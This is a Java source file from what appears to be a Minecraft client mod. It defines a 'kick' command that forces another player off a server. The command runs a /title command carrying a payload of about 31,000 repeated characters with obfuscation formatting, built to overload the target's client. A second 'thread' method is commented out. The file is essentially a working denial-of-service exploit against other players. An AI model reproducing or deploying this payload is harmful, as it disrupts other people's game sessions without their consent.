package land.chipmunk.chipmunkmod.command.commands;

import com.mojang.brigadier.Command;
import com.mojang.brigadier.CommandDispatcher;
import com.mojang.brigadier.context.CommandContext;
import net.fabricmc.fabric.api.client.command.v2.FabricClientCommandSource;
import land.chipmunk.chipmunkmod.modules.CommandCore;
import land.chipmunk.chipmunkmod.util.player.ChatUtils;

import static land.chipmunk.chipmunkmod.command.CommandManager.literal;
import static land.chipmunk.chipmunkmod.command.CommandManager.argument;
import static com.mojang.brigadier.arguments.StringArgumentType.word;
import static com.mojang.brigadier.arguments.StringArgumentType.getString;

public class KickCommand {
  private static final String PAYLOAD_LONGSTRING = "Hi\u00a7k" + "猫".repeat(31000) + "\u00a7r:>";
  private static final String PAYLOAD_THREADDESTROYER = "Payload";

  public static void register(CommandDispatcher<FabricClientCommandSource> dispatcher) {
    dispatcher.register(
            literal("kick")
                    .then(literal("longstring")
                            .then(argument("player", word())
                                    .executes(context -> executeKick(context, "longstring"))
                            )
                    )
//                    .then(literal("thread")
//                            .then(argument("player", word())
//                                    .executes(context -> executeKick(context, "thread"))
//                            )
//                    )
    );
  }

  public static int executeKick(CommandContext<FabricClientCommandSource> context, String method) {
    String player = getString(context, "player");

    switch (method) {
      case "longstring" -> {
        executeLongString(player);
        ChatUtils.infoPrefix("Kick", "Executing [hl]Long String[def] kick on [hl]%s", player);
      }
    }

    return Command.SINGLE_SUCCESS;
  }

  private static void executeLongString(String player) {
    CommandCore.INSTANCE.run("/title " + player + " title \"" + PAYLOAD_LONGSTRING + "\"");
  }
}